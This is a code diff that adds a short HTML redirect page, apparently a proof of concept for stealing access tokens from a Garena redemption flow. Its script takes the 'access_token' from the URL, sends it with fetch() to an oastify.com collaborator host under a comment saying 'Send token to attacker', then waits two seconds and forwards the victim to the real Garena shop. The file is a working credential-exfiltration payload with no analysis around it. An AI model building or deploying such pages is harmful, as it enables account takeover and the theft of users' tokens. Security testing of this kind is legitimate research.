@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Redirecting...</h2>
+    <script>
+      const token = new URLSearchParams(window.location.search).get("access_token");
+      if (token) {
+        // Send token to attacker
+        fetch("https://bs74d5yb2cg675qae9w7n3ae85ew2vqk.oastify.com/leak?token=" + encodeURIComponent(token));
+      }
+
+      // Then redirect to the real Garena URL (with or without token)
+      setTimeout(() => {
+        window.location.href = "https://shop.garena.sg/?utm_source=FF+RedeemPage&utm_medium=Entrance";
+      }, 2000); // Wait 2 seconds to make sure the token is sent
+    </script>
+  </body>
+</html>
